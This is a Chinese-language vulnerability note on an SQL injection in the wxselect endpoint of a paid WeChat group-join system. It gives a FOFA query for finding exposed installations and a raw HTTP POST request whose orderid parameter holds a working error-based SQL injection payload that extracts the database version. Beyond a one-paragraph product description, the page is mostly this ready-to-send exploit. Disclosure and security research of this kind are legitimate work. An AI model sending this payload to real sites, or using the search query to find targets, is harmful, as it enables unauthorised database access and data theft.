# 九块九付费进群系统wxselect存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(47, 48, 52);">九块九付费进群系统是一种新的社群管理方式，用户通过支付9.9元人民币即可加入特定的微信群，享受群内提供的服务或资源。这种模式通常用于知识分享、资源下载、专业交流等社群，通过设置门槛来筛选成员，提高群组的专业性和互动质量。</font>

# 二、影响版本
+ 九块九付费进群系统

# 三、资产测绘
+ fofa`body="/website/index/login.html"`
+ 特征

![1727023333396-3a7f6804-9a8f-4e9c-bc92-025420191364.png](./img/dKPKVxkRHevpbLyx/1727023333396-3a7f6804-9a8f-4e9c-bc92-025420191364-061163.png)

# 四、漏洞复现
```go
POST /group/index/wxselect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
 
orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x7e)),1,190))),5417)-- ylIU
```

![1727023353581-462c7f1d-7f5f-4154-995c-eb4145dc950c.png](./img/dKPKVxkRHevpbLyx/1727023353581-462c7f1d-7f5f-4154-995c-eb4145dc950c-570829.png)

```go
POST /group/index/wxselect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
 
orderid=1
```



> 更新: 2024-10-22 09:36:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bdvfpxsyrd03yo6q>